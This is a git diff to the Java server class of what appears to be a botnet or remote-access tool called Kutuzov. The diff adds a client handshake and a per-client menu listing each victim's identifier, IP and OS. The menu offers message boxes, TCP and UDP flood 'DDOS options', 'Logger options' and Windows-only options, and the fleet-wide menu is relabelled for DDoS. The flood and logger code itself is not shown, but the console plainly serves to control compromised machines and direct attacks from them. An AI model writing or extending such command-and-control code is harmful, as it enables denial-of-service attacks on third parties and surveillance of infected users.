@@ -1,8 +1,6 @@
 package me.kutuzov.server;
 
-import me.kutuzov.packet.CSDAResPacket;
-import me.kutuzov.packet.SCDAPacket;
-import me.kutuzov.packet.SCMessageBoxPacket;
+import me.kutuzov.packet.*;
 import me.kutuzov.server.client.Client;
 import me.kutuzov.server.client.ClientManager;
 import me.kutuzov.server.util.LoadingWheel;
@@ -55,7 +53,13 @@ public class KutuzovServer {
                 }
 
                 Client client = clientManager.newClient(clientSocket);
-                // pnl("Client connected(" + clientManager.clients.size() + "): " + client.getIp());
+                try {
+                    client.getOutput().writeObject(new SCRequireHandshakePacket());
+                    CSHandshakePacket handshakePacket = (CSHandshakePacket)client.getInput().readObject();
+                    client.setIdentifierName(handshakePacket.identifierName);
+                } catch (IOException | ClassNotFoundException e) {
+                    pnl("Could not request handshake from client(" + client.getIp() + ")!");
+                }
             }
         });
         thread.start();
@@ -75,6 +79,7 @@ public class KutuzovServer {
         });
         checkThreadLoop.start();
 
+        trySleep(1000);
         loadingWheel.showing.set(false);
         trySleep(1000);
         clearConsole();
@@ -86,10 +91,10 @@ public class KutuzovServer {
 
     private void dos_options() {
         clearConsole();
-        pnl("DOS options:");
-        pnl("  0. Back");
-        pnl("  1. TCP Flood");
-        pnl("  2. UDP Flood");
+        pnl("DDOS options:");
+        pnl("  0) Back");
+        pnl("  1) TCP Flood");
+        pnl("  2) UDP Flood");
         // pnl("  3. HTTP Flood");
         pnl("");
         pwl("Select option: ");
@@ -187,13 +192,80 @@ public class KutuzovServer {
         }
     }
 
+    private void user_list_client_dos_options() {
+        clearConsole();
+        pnl("Client DOS options:");
+        pnl("  1) TCP Flood");
+        pnl("  2) UDP Flood");
+    }
+
+    private void user_list_client(Client client) {
+        clearConsole();
+        pnl("ID: " + client.getIdentifierName());
+        pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
+        pnl("OS: " + client.getOs());
+        pnl("Options: ");
+        pnl("  0) Go back");
+        pnl("  1) Send message");
+        pnl("  2) DOS options");
+        pnl("  3) Logger options");
+        pnl("  4) Windows only options");
+        pwl("Option: ");
+
+        String input = readLine();
+        int option = input.contentEquals("")?-1:Integer.parseInt(input);
+        switch (option) {
+            case 1: {
+                clearConsole();
+                pwl("Title: ");
+                String title = readLine();
+                pwl("Content: ");
+                String content = readLine();
+
+                try {
+                    client.getOutput().writeObject(new SCMessageBoxPacket(title, content));
+                } catch (Exception e) {
+                    pnl("Failed to send message! (" + e.getMessage() + ")");
+                    readLine();
+                }
+            } break;
+
+            case 0:
+                return;
+            default: break;
+        }
+
+        user_list_client(client);
+    }
+
+    private void user_list() {
+        clearConsole();
+        pnl("User list(" + clientManager.clients.size() + "):");
+        for(Map.Entry<String, Client> entry : clientManager.clients.entrySet())
+            pnl(" - " + entry.getValue().getFormattedIdentifierName());
+        pwl("Select user(0 to go back): ");
+        String input = readLine();
+        if(input.equals("0"))
+            return;
+
+        Client client = clientManager.findClient(input);
+        if(client == null) {
+            pnl("User not found!");
+            user_list();
+            return;
+        }
+
+        user_list_client(client);
+    }
+
     private void menu() {
         clearConsole();
         pnl("Connected clients: " + clientManager.clients.size());
         pnl("Select action:");
         pnl("  0) Refresh");
         pnl("  1) MessageBox all clients");
-        pnl("  2) Dos options");
+        pnl("  2) DDOS options");
+        pnl("  3) User list");
         pnl("  9) Stop server & exit");
         pnl("");
         pwl("Select action: ");
@@ -218,6 +290,10 @@ public class KutuzovServer {
                 break;
             case 2:
                 dos_options();
+                menu();
+                break;
+            case 3:
+                user_list();
                 menu();
                 break;
 
